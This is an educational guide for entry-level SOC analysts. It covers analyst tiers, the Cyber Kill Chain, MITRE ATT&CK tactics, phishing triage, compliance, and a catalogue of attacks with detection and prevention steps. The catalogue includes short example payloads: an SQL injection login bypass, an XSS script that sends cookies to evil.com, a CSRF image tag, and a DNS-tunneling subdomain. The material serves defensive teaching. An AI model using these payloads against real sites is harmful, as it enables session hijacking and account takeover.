📡 Module 01

What is a SOC?

A Security Operations Centre is the nerve centre of an organization's cybersecurity — a dedicated team monitoring, detecting, and responding to threats 24/7.

💡Simple Definition
Think of a SOC like a hospital emergency room for cyber incidents. Just like an ER has doctors monitoring patients around the clock and responding to emergencies, a SOC has security analysts watching networks and systems — catching threats before they cause serious damage.

The three pillars of any SOC are: People Process Technology
🎯Core Mission
DETECTSpot threats before they cause damage
INVESTIGATEConfirm whether alerts are real attacks
RESPONDContain and neutralize incidents
REPORTCommunicate findings to management
📊Why Every Organization Needs a SOC
Threat RealityWhat It Means for Organizations
Cyberattack happens every 39 secondsConstant targeting — automated monitoring is essential
Average breach detection: 207 daysAttackers go undetected for months without a SOC
Average breach cost: $4.45 millionSOC investment pays back many times over
95% of breaches involve human errorAnalysts catch what automated tools miss
🏢 In-House SOC
Organization runs its own team. Full control, higher cost. Common in banks and government agencies.
🤝 MSSP / Co-Managed
Managed Security Service Provider. Outsourced SOC. Cost-effective. Popular with small-to-mid businesses.
💻 Virtual SOC
Fully remote team, no physical room. Flexible modern model that became standard after 2020.
💡 Interview Tip
Always mention the three pillars: People (analysts), Process (IR procedures), and Technology (SIEM, EDR, firewalls). Interviewers want structured thinking, not just buzzwords.

SOC Fundamentals

Who works in a SOC, what do they do, and what tools do they use every day?

Analyst Tiers — The SOC Hierarchy

  • L1
    Tier 1 — Alert Triage Analyst (This is you!)First line of defense. Monitors SIEM alerts 24/7. Classifies alerts as True Positive or False Positive. Escalates confirmed incidents to L2. Skills needed: networking basics, reading logs, following playbooks, SIEM navigation.
  • L2
    Tier 2 — Incident ResponderReceives escalations from L1. Performs deeper forensic investigation. Hunts for attacker persistence mechanisms. Leads containment. Writes detailed incident reports. Skills: digital forensics, threat hunting, advanced log correlation.
  • L3
    Tier 3 — Threat Hunter / Senior AnalystProactively searches for threats that bypassed all automated detection. Deep malware reverse engineering. Creates new SIEM detection rules and YARA signatures. Works closely with threat intelligence teams.
  • MGR
    SOC ManagerManages team, handles executive escalations, reports to CISO, manages tooling budget. Drives SLA compliance and continuous process improvement.

Cyber Kill Chain

Created by Lockheed Martin, the Cyber Kill Chain breaks every cyberattack into 7 stages. Your job as a SOC analyst: break the chain as early as possible. Earlier = far less damage.

💡 The Core Idea
Every real cyberattack — from ransomware to espionage — follows these same 7 stages in order. If defenders can detect and stop the attacker at Stage 1 or 2, the attacker achieves nothing. If they're only detected at Stage 7, the damage is already done. Your detection rules target specific stages.
🔎 Real Story Used Throughout
We'll follow one complete attack story — "Operation Invoice" — where an attacker targets ACME Corp's finance department. Watch how each stage unfolds.
1
Stage 1 · Before Any Attack
🔍 Reconnaissance — "Casing the Target"
The attacker gathers as much information as possible about the target before doing anything. No contact with the target yet — just research. Think of it like a thief studying a bank's floor plan, shift schedules, and camera positions before the heist.

Passive Recon: Google, LinkedIn, company website, WHOIS lookups, job postings (reveals which tech stack they use).
Active Recon: Port scanning (Nmap), subdomain enumeration, email harvesting.
📌 Operation Invoice — Stage 1: Attacker searches LinkedIn and finds Sarah Jones, Finance Manager at ACME Corp. Notes her email format from a conference bio: [email protected]. Scans ACME's website and discovers they use Microsoft 365. Now they know exactly who to target and how.
✅ SOC Defense: Monitor for external port scans hitting your perimeter. Use honeypots. Minimize OSINT exposure.
2
Stage 2 · Preparing the Weapon
🔧 Weaponization — "Building the Trap"
The attacker crafts their weapon — a malicious file, a phishing email, or an exploit kit. Still no contact with the target. The attacker is in their own environment building their tools. This is why threat intelligence matters — defenders can identify attacker infrastructure before it's even used.
📌 Operation Invoice — Stage 2: Attacker creates "Q4_Invoice_ACME.xlsx" — a real-looking Excel file with a malicious macro hidden inside. Registers the domain acme-invoices.com to host the malware payload. Tests it against major AV engines to make sure it goes undetected.
✅ SOC Defense: Threat intelligence feeds. Monitor for newly registered domains typosquatting your brand.
3
Stage 3 · First Contact
📨 Delivery — "Sending the Trap"
The weapon is delivered to the target. This is the first point of contact between attacker and victim. The most common delivery method is a phishing email — but also includes USB drops, malicious websites (watering holes), and drive-by downloads.
📌 Operation Invoice — Stage 3: Attacker sends an email to Sarah from [email protected] — "Please review the attached Q4 invoice from your supplier." The email passes basic spam filters. The Excel file is attached.
✅ SOC Defense: Email gateway with sandbox scanning. SPF/DKIM/DMARC enforcement. User phishing awareness training. URL filtering.
4
Stage 4 · The Trigger
💥 Exploitation — "Springing the Trap"
The malicious payload triggers. Could be: a user clicking a link, opening a file, enabling macros, or a software vulnerability being exploited with no user action required (zero-click exploits). This is the moment the attacker gets their first foothold.
📌 Operation Invoice — Stage 4: Sarah opens the Excel file. Microsoft Office shows a yellow banner: "Macros are disabled. Enable Content?" — Sarah, expecting a legitimate invoice, clicks Enable. The VBA macro executes immediately. EDR alert fires: "Suspicious macro execution in EXCEL.EXE"
✅ SOC Defense: EDR behavioural detection. Disable macros by Group Policy. Application allowlisting. Patch management for zero-days.
5
Stage 5 · Taking Root
🌱 Installation — "Setting Up Camp"
The attacker installs persistent malware so they can maintain access even after reboots, credential changes, or security tool updates. Common persistence mechanisms include registry run keys, scheduled tasks, new services, and DLL hijacking. This is where they make themselves at home.
📌 Operation Invoice — Stage 5: The Excel macro downloads a Remote Access Trojan (RAT) from acme-invoices.com/update.exe. The RAT installs itself to C:\Users\Sarah\AppData\Roaming\svchost32.exe and adds a registry key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run so it starts every time Sarah logs in.
✅ SOC Defense: Monitor registry run keys (Event ID 7045). Sysmon process creation rules. EDR detecting file writes to AppData.
6
Stage 6 · Remote Control
📡 Command & Control (C2) — "Phoning Home"
The installed malware connects back to the attacker's server (Command & Control / C2 server). Now the attacker has a remote keyboard on the victim's machine. They can send commands, receive stolen data, and launch further attacks — all over what looks like normal HTTPS traffic to blend in.
📌 Operation Invoice — Stage 6: The RAT connects to 185.220.101.45 over HTTPS port 443 every 5 minutes (beaconing). The attacker's terminal shows: "Connection received: ACME-SARAH-LAPTOP | User: sarah.jones | Domain: ACMECORP". They now have full control of her machine.
✅ SOC Defense: Monitor outbound HTTPS to new/unknown IPs. Detect beaconing (regular exact-interval connections). DNS filtering. Proxy logs analysis.
7
Stage 7 · The Endgame
🎯 Actions on Objectives — "The Actual Crime"
The attacker achieves their goal. Everything before this was just preparation. Objectives vary by attacker: financial criminals want to steal money or data, nation-state attackers want espionage, ransomware gangs want to encrypt and extort, hacktivists want to cause disruption. At this stage, the damage is being done.
📌 Operation Invoice — Stage 7: From Sarah's laptop, the attacker uses Mimikatz to dump domain credentials. They move laterally to the Domain Controller using stolen admin credentials. They exfiltrate 50GB of financial records. Then deploy ransomware across the entire domain — 200 machines encrypted. Ransom note: "Pay $2M in Bitcoin within 72 hours."
✅ SOC Defense: Network segmentation to limit lateral movement. DLP tools to detect large data transfers. EDR detecting Mimikatz signatures and shadow copy deletion.
✅ Key Takeaway
Stage 1–3 prevention = Attacker never gets in. Stage 4–5 detection = Catch them early with limited damage. Stage 6–7 detection = Full incident response required. The goal is always to detect as early as possible.
🗂️ Module 07

MITRE ATT&CK Framework

The universal language of cybersecurity — a living knowledge base that documents exactly how real-world attackers operate, built from actual observed intrusions.

📖 What is MITRE ATT&CK? — Full Definition
MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) is a globally accessible, continuously updated knowledge base of adversary behavior — based on real-world cyberattacks observed by security researchers, government agencies, and private organizations worldwide.

Developed by MITRE Corporation (a US nonprofit) and first released publicly in 2015, it has become the de facto standard language that security teams, threat intel analysts, red teams, and SOC analysts use to describe, classify, and communicate about attacks with precision.

The framework is organized as a matrix:
  • Columns = Tactics — the attacker's goal at a given stage (the "why")
  • Rows = Techniques — the specific method used to achieve that goal (the "how")
  • Sub-techniques — detailed variations of a technique (the "exactly how")

Currently, ATT&CK for Enterprise contains 14 Tactics, 200+ Techniques, and 400+ Sub-techniques, each with a unique T-code (e.g., T1566.001 = Spear Phishing with Attachment).
💡 Kill Chain vs MITRE — The Key Difference
Kill Chain answers: "What stage of the attack are we at?" (7 broad stages)
MITRE ATT&CK answers: "Exactly HOW is the attacker doing this right now?" (200+ specific techniques)

Example: Kill Chain Stage 5 = "Installation." ATT&CK is more specific: T1053.005 = Scheduled Task persistence or T1547.001 = Registry Run Key persistence. ATT&CK tells you precisely which technique to hunt for.
⚡ How SOC Analysts Use ATT&CK Daily
Alert classification: Map each alert to a technique (e.g., "This PowerShell alert = T1059.001")
Detection rules: Write SIEM rules targeting specific T-codes
Threat hunting: After finding T1059, hunt for related T1003 (credential dumping)
Reporting: "The threat actor used T1566 for initial access and T1486 for impact" — precise, universal language
Gap analysis: Check which techniques you have no detection coverage for

The 14 Tactics — Deep Dive

Every tactic below includes: what it means, the attacker's goal, key techniques, and a real-world example.

TA0043 🔍 Reconnaissance
Attacker's Goal: Gather as much intelligence about the target as possible before any attack begins — without triggering any alerts.

What they're doing: The attacker is a researcher at this stage. They scan public sources, social media, job postings, WHOIS records, and technical databases to map the target's infrastructure, technology stack, employees, and potential weaknesses. No contact with target systems yet.

Key Techniques
T1595 — Active Scanning (Nmap port scans)
T1592 — Gather Victim Host Information
T1589 — Gather Victim Identity Info (LinkedIn harvesting)
T1590 — Gather Victim Network Info (WHOIS, DNS records)
📌 Real Example
APT29 (Cozy Bear) used LinkedIn to identify employees at target organizations, scraped email formats from public conference bios, and ran Shodan scans to find exposed VPN endpoints — all before sending a single phishing email.
🛡️ SOC Defense: Monitor for external port scans on your perimeter. Minimize OSINT footprint. Use honeypots to detect active recon.
TA0042 🔧 Resource Development
Attacker's Goal: Build or acquire the tools, infrastructure, and capabilities needed to carry out the attack — before any target interaction.

What they're doing: Registering lookalike domains, purchasing servers to host malware, setting up C2 infrastructure, creating fake email accounts, buying code-signing certificates, building or buying exploit kits, or compromising legitimate websites to use as staging points.

Key Techniques
T1583.001 — Register attack domains (acme-invoices.com)
T1587.001 — Develop custom malware payloads
T1588.002 — Obtain tools (Cobalt Strike, Metasploit)
T1608.001 — Upload malware to staging server
📌 Real Example
Lazarus Group (North Korea) registered hundreds of fake cryptocurrency company domains days before phishing campaigns — researchers tracked the pattern and attributed attacks by spotting domain infrastructure being set up in advance.
🛡️ SOC Defense: Subscribe to threat intel feeds that track new domain registrations. Use DNS reputation tools to catch newly registered lookalike domains.
TA0001 🚪 Initial Access
Attacker's Goal: Get the very first foothold inside the target environment. This is the moment the attacker crosses from "outside" to "inside."

What they're doing: Delivering a phishing email, exploiting a public-facing vulnerability (unpatched VPN, web application), using valid stolen credentials, or exploiting a supply chain (compromising a trusted software vendor). This is the single most important stage to detect — catching it here means no breach occurs.

Key Techniques
T1566.001 — Spear Phishing with Attachment
T1566.002 — Spear Phishing via Link
T1190 — Exploit Public-Facing Application
T1078 — Valid Accounts (stolen credentials)
T1195 — Supply Chain Compromise
📌 Real Example
SolarWinds attack (2020): Attackers used T1195 (Supply Chain Compromise) — poisoned the SolarWinds Orion software update. 18,000 organizations including US Treasury and DoD installed the malicious update, giving attackers access without a single phishing email.
🛡️ SOC Defense: Email gateway sandbox. MFA on all external-facing services. Patch critical CVEs within 48 hours. Monitor for logins from new geolocations.
TA0002 ⚙️ Execution
Attacker's Goal: Run malicious code on the victim's system to take an action — download more tools, establish C2, escalate privileges, or cause damage.

What they're doing: Using PowerShell, CMD, WMI, or scripting languages to execute payloads. Often abuses built-in Windows tools (called "Living off the Land" / LOLBins) to blend in with normal admin activity and avoid triggering AV signatures.

Key Techniques
T1059.001 — PowerShell execution
T1059.003 — Windows Command Shell (cmd.exe)
T1204.002 — Malicious File (user opens it)
T1047 — Windows Management Instrumentation (WMI)
T1053.005 — Scheduled Task execution
📌 Real Example
Emotet malware uses T1059.001 — PowerShell with Base64-encoded commands to download the next stage payload. EDR alert fires: WINWORD.EXE spawned PowerShell.exe with -EncodedCommand parameter. This process chain is one of the most common L1 alerts you'll see.
🛡️ SOC Defense: Script block logging for PowerShell. SIEM rules for Office spawning cmd/PowerShell. Application allowlisting to block unauthorized execution.
TA0003 🌱 Persistence
Attacker's Goal: Ensure their access survives reboots, password changes, and security tool updates. A persistent attacker can always come back even if their initial malware is removed.

What they're doing: Creating registry run keys, scheduled tasks, new services, or startup folder entries so their malware automatically re-executes. Advanced attackers use firmware implants, bootkit infections, or backdoored admin accounts as persistence.

Key Techniques
T1547.001 — Registry Run Keys (HKLM\Software\Run)
T1053.005 — Scheduled Task creation
T1543.003 — Create/modify Windows Service
T1136 — Create Account (backdoor admin user)
T1505.003 — Web Shell on server
📌 Real Example
Chinese APT41 planted a web shell (T1505.003) on a compromised web server — a simple PHP file that gave them remote command execution access to the server anytime they visited a specific URL. Even after the initial malware was cleaned, the web shell remained active for months.
🛡️ SOC Defense: Windows Event ID 7045 (new service). Monitor registry run keys. Sysmon process creation. Scheduled task creation alerts. Regular web shell scanning on internet-facing servers.
TA0004 🔑 Privilege Escalation
Attacker's Goal: Elevate from a low-privilege account (regular user) to a high-privilege one (local admin, domain admin, SYSTEM) to access more systems and bypass more controls.

What they're doing: Exploiting kernel vulnerabilities, abusing misconfigured services, bypassing User Account Control (UAC), or stealing credentials from higher-privileged processes. Domain admin = keys to the entire kingdom — can access every machine, every share, every database.

Key Techniques
T1548.002 — Bypass User Account Control (UAC)
T1068 — Exploit kernel vulnerability for SYSTEM
T1134 — Access Token Manipulation
T1055 — Process Injection into high-priv process
T1611 — Escape from container to host
📌 Real Example
WannaCry used T1068 — it exploited the EternalBlue vulnerability (MS17-010) to gain SYSTEM-level privileges on vulnerable Windows systems. With SYSTEM access, it could spread to every machine on the network without any user interaction.
🛡️ SOC Defense: EDR alerts on UAC bypass attempts. Event IDs 4672 (special privilege assigned) and 4732 (user added to admin group). Apply patches for known privilege escalation CVEs promptly.
TA0005 🥷 Defense Evasion
Attacker's Goal: Stay hidden. Avoid detection by antivirus, EDR, SIEM rules, and human analysts for as long as possible. The longer they remain undetected, the more damage they can do.

What they're doing: Deleting event logs, disabling AV, obfuscating code, using trusted signed binaries (LOLBins), injecting into legitimate processes, or living inside encrypted traffic. This is the most technique-rich tactic in ATT&CK — attackers invest heavily here.

Key Techniques
T1070.001 — Clear Windows Event Logs (Event ID 1102!)
T1562.001 — Disable AV / EDR software
T1027 — Obfuscated Files / Base64 encoding
T1036 — Masquerading (rename malware as svchost.exe)
T1218 — System Binary Proxy (use certutil.exe to download)
📌 Real Example
Cobalt Strike (used by many ransomware gangs) uses T1027 extensively — all C2 traffic is encrypted and mimics legitimate HTTPS browsing. Payloads are Base64-encoded and injected into memory without ever touching disk, bypassing file-based AV completely. This is called "fileless malware."
🛡️ SOC Defense: Alert on Event ID 1102 (log cleared) — immediate escalation. Canary event logs. Behavioral EDR that doesn't rely on signatures. Alert on LOLBin abuse (certutil, bitsadmin downloading files).
TA0006 🔓 Credential Access
Attacker's Goal: Steal valid usernames and passwords — because legitimate credentials are far more valuable than any malware. With real credentials, attackers blend in perfectly with normal traffic.

What they're doing: Dumping Windows password hashes from memory using Mimikatz, harvesting credentials from browser storage, intercepting Kerberos tickets, or brute-forcing authentication services. Stolen credentials enable lateral movement and persistence that's extremely hard to detect.

Key Techniques
T1003.001 — LSASS Memory dump (Mimikatz)
T1558.003 — Kerberoasting (crack service account passwords)
T1110 — Brute Force / Password Spray
T1555.003 — Credentials from browser password stores
T1056.001 — Keylogging
📌 Real Example
In almost every major ransomware attack, Mimikatz (T1003.001) is used within hours of initial access to dump LSASS memory and extract domain admin credentials. The NotPetya attack spread to 60+ countries in under an hour because it immediately harvested and reused credentials to propagate.
🛡️ SOC Defense: EDR alert on LSASS memory access. Enable Windows Credential Guard. Alert on Mimikatz signatures. Monitor Kerberos ticket anomalies. Enforce MFA so stolen passwords alone are not enough.
TA0007 🗺️ Discovery
Attacker's Goal: Understand the internal environment — what machines exist, what data is stored where, who the high-value targets are, and what security tools are deployed.

What they're doing: Running internal network scans, querying Active Directory for users and groups, checking installed software, identifying security products to evade, and mapping file shares. Discovery often happens very quietly using built-in Windows commands (net, ipconfig, whoami) that generate minimal noise.

Key Techniques
T1018 — Remote System Discovery (net view, nmap)
T1087 — Account Discovery (net user, net group)
T1083 — File and Directory Discovery
T1482 — Domain Trust Discovery
T1518.001 — Security Software Discovery (what AV is installed?)
📌 Real Example
After initial compromise, FIN7 (criminal group) ran a series of discovery commands: whoami /all, net view /domain, nltest /domain_trusts. These commands — each taking under 1 second — gave them a complete map of the domain in minutes. SIEM rule: multiple discovery commands from one host within 5 minutes = alert.
🛡️ SOC Defense: SIEM rule — multiple net/whoami/ipconfig commands from one host within short window. Alert on internal network scanning. Active Directory query monitoring for unusual bulk account lookups.
TA0008 🏃 Lateral Movement
Attacker's Goal: Move from the initially compromised machine to other, more valuable targets inside the network — working toward domain controllers, financial systems, or sensitive data repositories.

What they're doing: Using stolen credentials or exploits to authenticate to other internal systems via RDP, SMB, WMI, or SSH. Pass-the-Hash and Pass-the-Ticket allow movement without knowing plaintext passwords. This is often the stage where one compromised laptop becomes a full organizational breach.

Key Techniques
T1550.002 — Pass the Hash (use NTLM hash without password)
T1550.003 — Pass the Ticket (reuse Kerberos tickets)
T1021.001 — Remote Desktop Protocol (RDP)
T1021.002 — SMB / Windows Admin Shares
T1570 — Lateral Tool Transfer (copy tools to new machines)
📌 Real Example
The Colonial Pipeline ransomware attack: attackers gained initial access through a single VPN account with no MFA, then used T1021 to move laterally across the IT network over 5 days before deploying ransomware — eventually causing fuel shortages across the US East Coast.
🛡️ SOC Defense: Alert on unusual internal RDP or SMB connections. Network segmentation to limit blast radius. Privileged Access Workstations. Alert on PsExec and WMI remote execution. Honeypot credentials in AD.
TA0009 📦 Collection
Attacker's Goal: Identify and gather the data they came to steal — customer records, financial data, intellectual property, emails, or strategic plans — before exfiltrating it out of the network.

What they're doing: Searching file servers and databases, compressing and staging data into archives (usually in a temp folder), capturing screenshots, recording audio/video from compromised workstations, or harvesting email inboxes. Data is often staged locally before exfiltration to avoid triggering data loss prevention (DLP) tools.

Key Techniques
T1114.002 — Remote Email Collection (mailbox access)
T1213 — Data from Information Repositories (SharePoint, Confluence)
T1005 — Data from Local System (searching files)
T1560.001 — Archive Collected Data (WinRAR, 7-Zip)
T1074 — Data Staged (move to temp folder before exfil)
📌 Real Example
In the Marriott hotel breach, attackers used T1114 to harvest 500 million guest records from the Starwood guest reservation database. The breach went undetected for 4 years — from 2014 to 2018 — because data collection was gradual and blended in with normal database queries.
🛡️ SOC Defense: DLP tools monitoring file access patterns. Alert on bulk file reads or zip archive creation in temp folders. Email access auditing — alert on unusual mailbox access from new IPs or devices.
TA0011 📡 Command & Control (C2)
Attacker's Goal: Maintain a reliable, covert communication channel between the attacker and the compromised systems to send commands and receive results — all without being detected.

What they're doing: The installed malware "beacons" (checks in) with the attacker's C2 server at regular intervals over protocols that blend with normal traffic — HTTPS, DNS, or even social media APIs. The attacker can then issue commands, upload additional tools, retrieve stolen data, or trigger the final attack phase.

Key Techniques
T1071.001 — C2 over HTTPS (blends with web traffic)
T1071.004 — C2 over DNS (queries to attacker's DNS server)
T1090 — Proxy / multi-hop to hide true C2 IP
T1132 — Data Encoding (Base64 in HTTP headers)
T1568 — Dynamic Resolution (DGA domains)
📌 Real Example
SUNBURST malware (SolarWinds) used T1568 (DGA) and T1071.001 (HTTPS C2) with a 12–14 day dormancy period after installation before activating — specifically to evade sandbox analysis tools that only run samples for a few minutes. It used legitimate Cloudflare infrastructure as a proxy to hide the true C2 server location.
🛡️ SOC Defense: Detect beaconing (exact-interval outbound HTTPS connections). DNS query analysis for DGA patterns. Proxy logs inspecting certificate anomalies. Threat intel feeds with known C2 IPs and domains.
TA0010 📤 Exfiltration
Attacker's Goal: Get the stolen data out of the victim's network and into attacker-controlled infrastructure — without triggering DLP or network monitoring tools.

What they're doing: Uploading compressed, encrypted archives to cloud storage (Dropbox, Google Drive, mega.nz), exfiltrating over the existing C2 channel, using DNS queries to encode and smuggle data out, or even mailing physical storage media. Timing data exfiltration during business hours in normal-size chunks avoids anomaly detection.

Key Techniques
T1041 — Exfil Over C2 Channel
T1567.002 — Exfil to Cloud Storage (Dropbox)
T1048.003 — Exfil Over Alternative Protocol (DNS)
T1030 — Data Transfer Size Limits (small chunks to avoid detection)

L1 Investigation Process — Step by Step

  • 1
    Check Email HeadersVerify SPF, DKIM, DMARC status. Check the actual "Reply-To" domain vs display name. Look at originating IP. All three auth checks failing = strong phishing indicator. Use: MXToolbox Header Analyzer.
  • 2
    Analyse the Sender DomainRun sender domain through VirusTotal and WHOIS. How old is the domain? Attacker domains are often hours or days old. Look for typosquatting: micros0ft, paypa1, g00gle, amaz0n.
  • 3

  • 5
    Check if Anyone ClickedSearch SIEM/proxy logs for the malicious URL across ALL users. Search email gateway logs for everyone who received the same email. Check EDR for any post-click process activity on affected machines.
  • 6
    Respond & DocumentIf confirmed phishing: Pull email from ALL mailboxes (M365 admin portal or email gateway). Block sender domain and malicious URLs. Reset credentials for users who clicked. Document all IOCs in the ticket and close it.

Risk Assessment

Risk assessment is the process of identifying what could go wrong, how likely it is, and how bad it would be — so you can prioritize where to invest security resources.

💡 The Core Formula
Risk = Likelihood × Impact
A vulnerability that's very easy to exploit (high likelihood) AND would cause massive damage (high impact) = Critical Risk. A vulnerability that's hard to exploit AND causes minimal damage = Low Risk. Risk assessment helps you prioritize.
📋 Risk Assessment Process
  • 1
    Asset IdentificationWhat do you need to protect? Servers, databases, applications, endpoints, user accounts, data. You can't protect what you don't know about.
  • 2
    Threat IdentificationWhat could harm those assets? Ransomware, phishing, insider threat, DDoS, data breach, physical theft. Use threat intelligence to focus on realistic threats.
  • 3
    Vulnerability AssessmentWhat weaknesses exist that threats could exploit? Unpatched software, misconfigured cloud, weak passwords, no MFA, unsegmented networks.
  • 4
    Risk AnalysisFor each Threat + Vulnerability pair: score the Likelihood (1–5) and Impact (1–5). Multiply them. Risk score guides prioritization.
  • 5
    Risk TreatmentFor each risk, decide: Accept it, Mitigate it (add controls), Transfer it (insurance), or Avoid it (stop the risky activity). Document decisions.

Compliance Laws & Standards

Compliance laws define the minimum security requirements organizations must meet. SOC analysts work within compliance frameworks every day — especially in regulated industries like finance and healthcare.

💡 Compliance vs Security
Compliance ≠ Security. Compliance means meeting the minimum legal requirements. Security means actually protecting against real threats. A compliant organization can still get breached. The SOC's job is to go beyond compliance and achieve real security.
PCI-DSS
Payment Card Industry Data Security Standard
Applies to any organization that stores, processes, or transmits cardholder data (credit/debit card numbers). Created by Visa, Mastercard, Amex, and others. Violations can result in massive fines and loss of ability to process payments.

12 Core Requirements include: Install firewalls, encrypt cardholder data in transit, restrict access on a need-to-know basis, regularly test security systems, maintain an information security policy, monitor all access to cardholder data.
SOC Relevance: Your SIEM must log all access to cardholder data environments. Log retention periods are mandated (typically 12 months). Any breach of cardholder data is a PCI-DSS reportable incident with a strict response timeline. L1 analysts must know which alerts relate to PCI-scoped systems and escalate faster.
HIPAA
Health Insurance Portability and Accountability Act
US federal law that protects Protected Health Information (PHI) — any data that can identify a patient. Applies to healthcare providers, health insurers, and their business associates. HIPAA violations carry fines from $100 to $1.9M per violation category per year.

Key Rules: Privacy Rule (who can access PHI), Security Rule (technical, physical, administrative safeguards), Breach Notification Rule (must notify patients within 60 days of a breach), Omnibus Rule (extends requirements to vendors/subcontractors).
SOC Relevance: Any unauthorized access to patient data is a HIPAA breach that must be reported. SOC analysts monitor for unauthorized PHI access, abnormal database queries, and data exfiltration. Healthcare organizations are top ransomware targets — rapid incident detection and response is both a legal requirement and patient safety issue.
ISO 27001
ISO/IEC 27001 — Information Security Management System
The international standard for information security. Organizations can be certified by accredited auditors. Unlike PCI-DSS (prescriptive rules), ISO 27001 is a management system standard — it requires you to systematically identify risks and implement proportionate controls.

Annex A Controls relevant to SOC: A.12.4 Logging & Monitoring, A.16.1 Incident Management, A.8.15 Logging, A.8.16 Monitoring Activities. Certification requires passing an external audit every 3 years with annual surveillance audits.
SOC Relevance: ISO 27001 Annex A A.16 directly governs your SOC's incident management process. External auditors will review your SIEM alert logs, incident tickets, escalation procedures, and post-incident reports. Your documentation quality directly impacts the organization's certification status.
GDPR
General Data Protection Regulation
EU regulation protecting personal data of EU citizens. Applies to any organization worldwide that processes EU residents' data. Fines up to €20 million or 4% of global annual turnover — whichever is higher. Sets strict rules on data collection, processing, storage, and deletion.
SOC Relevance: GDPR Article 33 requires organizations to notify the relevant supervisory authority of a data breach within 72 hours of becoming aware. This means your SOC's MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond) directly affect GDPR compliance. SOC must have processes to detect personal data breaches rapidly.

WEBSQL Injection (SQLi)CRITICAL+
Malicious SQL code injected into input fields to manipulate the database — bypassing auth, stealing or deleting data.
📌 Login form: attacker enters ' OR '1'='1 — query always returns true, bypassing authentication entirely.
🔍 Detect

  • Unusual DB errors in app logs
  • Unexpected large data responses
🛡️ Prevent
  • Parameterized queries / prepared statements
  • Deploy WAF
  • Least-privilege DB accounts
🔧 Remediate
  • Block IP via WAF immediately
  • Patch vulnerable code
  • Audit DB for unauthorized changes
WEBCross-Site Scripting (XSS)HIGH+
Attacker injects malicious JavaScript into a web page. Script runs in victims' browsers — stealing cookies, hijacking sessions, redirecting users.
📌 Comment field: <script>document.location='evil.com?c='+document.cookie</script> — every visitor's session cookie sent to attacker.
🔍 Detect
  • WAF rules for <script> in inputs
  • CSP violation reports
  • Proxy: outbound requests to unknown hosts
🛡️ Prevent
  • HTML encode all output
  • Content Security Policy (CSP) header
  • HttpOnly & Secure cookie flags
🔧 Remediate
  • Remove malicious script from DB
  • Invalidate all active sessions
  • Notify affected users
WEBCSRF — Cross-Site Request ForgeryHIGH+
Tricks authenticated users' browsers into sending forged requests to a trusted site — using their active session without their knowledge.
📌 Hidden image tag in email: <img src="bank.com/transfer?to=attacker&amount=5000"> — bank executes transfer using victim's session cookie automatically.
🔍 Detect
  • Requests missing CSRF tokens in logs
  • State-change requests from unusual referrers
🛡️ Prevent
  • CSRF tokens on all state-changing forms
  • SameSite=Strict cookie attribute
  • Validate Origin/Referer headers
🔧 Remediate
  • Invalidate affected user session
  • Reverse unauthorized actions if possible
  • Deploy CSRF token protection in code
WEBCredential Stuffing / Brute ForceCRITICAL+
Credential stuffing uses leaked username/password lists to try logins on other sites (password reuse). Brute force tries all combinations systematically.
📌 LinkedIn breach credentials used to log into Netflix, Gmail, and banking sites — because users reuse passwords across multiple services.
🔍 Detect
  • High volume failed logins from one IP
  • Multiple accounts from same IP
  • Impossible travel alerts
🛡️ Prevent
  • Enforce MFA on all accounts
  • Account lockout after N failures
  • CAPTCHA on login forms
🔧 Remediate
  • Lock out affected accounts
  • Force password reset
  • Block attacker IPs via WAF

Thousands of compromised machines (botnet) flood a server with traffic until it crashes and becomes unreachable to legitimate users.
📌 2016 Mirai botnet — infected IoT cameras and routers, used them to flood Dyn DNS. Twitter, Netflix, Reddit down for hours.
🔍 Detect
  • Sudden traffic volume spike
  • High CPU/memory on web servers
  • Requests flood from one IP range
🛡️ Prevent
  • Cloudflare / AWS Shield DDoS protection
  • Rate limiting on all endpoints
  • CDN to absorb traffic
🔧 Remediate
  • Activate DDoS mitigation service
  • Block offending IPs via ACLs
  • Contact ISP for traffic scrubbing

🔧 Remediate

  • Audit what files were accessed
  • Patch vulnerable endpoint

  • Review all actions in hijack window
CLOUDSSRF — Cloud Metadata AttackHIGH+
Server-Side Request Forgery tricks the web server into querying the cloud metadata endpoint (169.254.169.254), exposing IAM credentials and instance details.
📌 Used in the Capital One breach. SSRF via WAF misconfiguration → queried metadata endpoint → IAM role credentials leaked.
🔍 Detect
  • WAF alerts for 169.254.169.254 requests
  • Outbound requests from web servers to internal IPs
🛡️ Prevent
  • Enable IMDSv2 (token-based metadata)
  • Block metadata IP at network level
  • Validate all user-supplied URLs
🔧 Remediate
  • Rotate exposed IAM credentials
  • Patch vulnerable application endpoint
NETWORKMan-in-the-Middle (MitM)CRITICAL+
Attacker secretly intercepts and relays communication between two parties. Both think they're talking directly. Can be done via ARP spoofing, rogue WiFi access points, or SSL stripping.
📌 Attacker on corporate WiFi uses ARP spoofing. All HTTP traffic between employees and internal systems flows through attacker's machine — capturing credentials and session tokens.
🔍 Detect
  • ARP table anomalies (duplicate MACs)
  • Unexpected SSL certificate changes
  • IDS alerting on ARP poisoning
🛡️ Prevent
  • HTTPS everywhere with HSTS
  • Dynamic ARP Inspection on switches
  • VPN for all sensitive communications
🔧 Remediate
  • Clear ARP cache on affected hosts
  • Identify and isolate rogue device
  • Force re-authentication for all users
NETWORKDNS TunnelingHIGH+
Attacker encodes data inside DNS queries to exfiltrate data or run C2 communications — bypassing firewalls that allow DNS port 53 outbound.
📌 Malware encodes stolen data in subdomains: YWRtaW4=.evil.com. Each DNS query carries encoded data to attacker's DNS server. Looks like normal DNS traffic.
🔍 Detect
  • Unusually long DNS query names (>100 chars)
  • High volume queries to one domain
  • High entropy in subdomain strings
🛡️ Prevent
  • DNS filtering and inspection
  • Block DNS-over-HTTPS to unknown resolvers
  • Monitor DNS query lengths
🔧 Remediate
  • Block malicious domain in DNS firewall
  • Isolate infected host
  • Investigate data exfiltrated
NETWORKLateral Movement (Pass-the-Hash)CRITICAL+
After initial access, attacker moves to other systems in the network. Pass-the-Hash uses captured NTLM hashes (not the plaintext password) to authenticate to other Windows machines.
📌 Attacker on Sarah's machine runs Mimikatz, dumps domain admin NTLM hash. Uses PsExec with that hash to connect to the Domain Controller — without ever knowing the password.
🔍 Detect
  • Unusual SMB/RDP between internal hosts
  • PsExec or WMI execution alerts
  • Rapid Event ID 4625 failures across multiple hosts
🛡️ Prevent
  • Network segmentation (VLANs)
  • Privileged Access Workstations (PAWs)
  • Disable NTLM, use Kerberos
🔧 Remediate
  • Isolate all affected hosts
  • Reset all potentially used credentials
  • Investigate full lateral movement scope
